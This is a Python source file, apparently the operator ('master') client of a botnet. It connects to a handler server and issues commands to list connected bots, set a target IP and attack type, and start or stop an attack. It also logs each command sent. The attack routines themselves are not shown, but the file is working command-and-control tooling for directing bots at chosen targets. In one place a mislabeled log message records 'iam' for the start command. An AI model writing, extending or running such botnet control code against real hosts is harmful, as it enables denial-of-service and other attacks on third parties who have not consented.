import threading
import socket
import argparse
import os
import sys
import time

RECV_BUFFER = 4096          # Memory buffer for recieving messages
ENCODING = 'utf-8'          # Outgoing messages are encoded in utf-8

botList = ""                # List of connected bots to be recieved from handler server

logString = ''              # String of logged events to be written to a log file


# addToLog takes a string s and appends it to the logstring, followed by a new line 
def addToLog(s):
    global logString 
    logString = logString + str(s) + '\n'


# writeLog writes the contents of the logstring to log.txt
def writeLog():
    global logString
    print('Writing Log...')
    with open("log.txt","w") as f:
        f.write(logString)


# The Send class is a threaded object used to send messages to the handler server based on user input
# Initialized by passing a socket to use for sending
class Send(threading.Thread):

    def __init__(self, sock: socket.socket) -> None:
        super().__init__()
        self.sock = sock            # Socket for sending data to handler server
        self.attktype = ''          # Record of which attack type to send to handler server
        self.targetip = ''          # Record of target address to send to handler server


    # showcommands displays the list of input options to the user
    def showcommands(self):
        print('\n'*2)
        print('='*10)
        print('Commands:\niam:{master or bot} ; Identifies client to server\nlistbot: ; Requests a list of connected bots\n\
changeip:{target_ip} ; Sets target IP\nchangeattk:{attack_type} ; Sets attack type\nstartattk: ; Executes chosen attack\n\
stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects from server') 
        print('='*10)


    # A loop which waits for user input and sends it to handler server
    def run(self):
        
        while True:
            time.sleep(2)               # Waits before displaying commands and input prompt so any incoming messages have time to display
            self.showcommands()         # Shows input options
            print('\nEnter Command: ')  
            sys.stdout.flush()
            message = sys.stdin.readline()[:-1]     # Reads input from user

            if message.upper() == 'DISCONNECT:':    # Disconnects from server if user inputs disconnect:
                self.disconnect()

            else:
                self.sock.sendall(message.encode(ENCODING))     # Encodes and sends user input directly to server
                curr_time = str(int(time.time()))               # Gets current unix timestamp and logs sent message
                addToLog(f'[{curr_time}] : Sent message: {message}')
           

    # changeip() through listbot() are functions which send each respective command to server and logs the event. Used for UI buttons
    def changeip(self):
        self.sock.sendall(f'changeip:{self.targetip}'.encode(ENCODING))
        print(f'Client: sending changeip:{self.targetip}')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : changeip sent')

    def changeattk(self):
        self.sock.sendall(f'changeattk:{self.attktype}'.encode(ENCODING))
        print(f'Client: sending changeattk:{self.attktype}')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : changeattk sent')

    def startattk(self):
        self.sock.sendall('startattk:'.encode(ENCODING))
        print('Client: sending iam')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : iam sent')

    def stopattk(self):
        self.sock.sendall('stopattk:'.encode(ENCODING))
        print('Client: sending stopattk')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : Stopattk Sent')

    def listbot(self):
        self.sock.sendall('listbot:'.encode(ENCODING))
        print('Client: requesting bot list')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : Requested Bot List')
   

    # Closes the socket and exits the program after logging the disconnect
    def disconnect(self):
        time.sleep(1)
        print('Disconnecting...')
        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : Client disconnected')
        self.sock.close()
        addToLog(f'[{curr_time}] : Socket Closed')
        addToLog(f'[{curr_time}] : Terminated Client')
        writeLog()
        os._exit(0)

    

# Receive class is a threaded object to listen for incoming messages and handle them. Initialized by passing a socket and client type (default is master)
class Receive(threading.Thread):

    def __init__(self, sock: socket.socket, client_type: str, client) -> None:
        super().__init__()
        self.sock = sock
        self.client_type = client_type
        self.client = client
        self.botlist = ''


    # A loop which listens for incoming data, and handles it if any is received. Otherwise, determines that client has been disconnected from server and closes program.
    def run(self) -> None:
        while True:
            try:
                recv_data = self.sock.recv(RECV_BUFFER)
            except ConnectionResetError:        # Handles and logs a forcibly terminated connection
                print("An existing connection was forcibly closed by the remote host")
                curr_time = str(int(time.time()))
                addToLog(f'[{curr_time}] : Connection forcibly closed by remote host')
                print('Quiting...')
                self.sock.close()
                addToLog(f'[{curr_time}] : Socket Closed')
                addToLog(f'[{curr_time}] : Terminated Client')
                writeLog()
                os._exit(0)


            if recv_data:
                self._req_handler(recv_data)        # Handles received data
            else:
                print('Disconnected from server')
                curr_time = str(int(time.time()))
                addToLog(f'[{curr_time}] : Disconnected from server')
                print('Quitting...')
                self.sock.close()
                addToLog(f'[{curr_time}] : Socket Closed')
                addToLog(f'[{curr_time}] : Terminated Client')
                writeLog()
                os._exit(0)


    # _req_handler takes received data in bytes as an argument
    def _req_handler(self, recv_data: bytes) -> None:
        recv_data_str = str(recv_data, ENCODING)
        try:
            request = recv_data_str.split(':')      # Messages consist of a command followed by any relevant information, seperated by ':'. This splits the message into its request and information
            req_type = request[0]
            if req_type == 'whoami':                # Server requests identification with whoami, client responds with iam:master
                print('Sending identification...')
                response = f'iam:{self.client_type}'.encode(ENCODING)
                self.sock.send(response)
            elif req_type == 'iam':         # If message received is iam:success, sets client as authenticated. Otherwise, authentification is failed and client terminates
                if request[1] == 'success':
                    self.client.set_authenticated()
                else:
                    print('Cannot be authenticated.')
                    curr_time = str(int(time.time()))
                    addToLog(f'[{curr_time}] : Server authentification failed')
                    print('Quitting...')
                    addToLog(f'[{curr_time}] : Socket closed')
                    addToLog(f'[{curr_time}] : Terminated Client')
                    writeLog()
                    self.sock.close()
                    os._exit(0)
            elif req_type == 'listbot':     # Incoming messages of type listbot: are handled by displaying the list of connected bots if they exist, or displaying 'no bots connected'
                if len(request[1]):
                    self.botlist = request[1]
                    time.sleep(1)
                    global botList
                    botList = self.botlist  # The bot list is also stored as a global variable for use by the GUI

                    print(f'Bots:\n{self.botlist}')
                    curr_time = str(int(time.time()))
                    addToLog(f'[{curr_time}] : Botlist Recieved')
                else:
                    print("No bots connected")
                    curr_time = str(int(time.time()))
                    addToLog(f'[{curr_time}] : Botlist Recieved: No bots connected')


            else:
                print(
                    f'\rReceived command/response -> {recv_data_str}')

        except ValueError as e:
            print('Could not parse request')
            # raise e



# Client class handles the creation of a socket and initiating a TCP connection to the handler server, as well as instantiating the Send and Recieve threads
class Client:

    def __init__(self, host: str, port: int, type: str) -> None:
        self.host = host
        self.port = port
        self.type = type
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.authenticated = False
        self.receive = None
        self.botlist = ''

    def start(self) -> None:
        print(f'Connecting to {self.host}:{self.port}...')
        self.sock.connect((self.host, self.port))
        print(f'Successfully connected to {self.host}:{self.port}...')

        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : Connected to {self.host}:{self.port}')


        try:
            self.receive = Receive(self.sock, self.type, self)
            self.receive.start()
            if self.type == 'master':
                send = Send(self.sock)
                send.start()

        except KeyboardInterrupt:
            print("caught keyboard interrupt, exiting")
            addToLog(f'[{curr_time}] : Caught Keyboard Interrupt')
            self.sock.close()
            addToLog(f'[{curr_time}] : Socket Closed')
            addToLog(f'[{curr_time}] : Terminated Client')
            writeLog()
            os._exit(0)
        

        return


    def getBotList(self):
        print(f'Bots: {self.receive.botlist}')


    def set_authenticated(self) -> None:
        self.authenticated = True
        print('Successfully authorized')
        #if self.type == 'master':
            #send = Send(self.sock)
            #send.start()

        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Client CLI')
    parser.add_argument('host', help='Interface the server listens at')
    parser.add_argument('-p', metavar='PORT', type=int,
                        default=8080, help='TCP port (default 8080)')
    parser.add_argument('-t', metavar='TYPE', type=str,
                        default='master', help='Client type (master or bot)')
    args = parser.parse_args()
    client = Client(args.host, args.p, args.t)
    client.start()
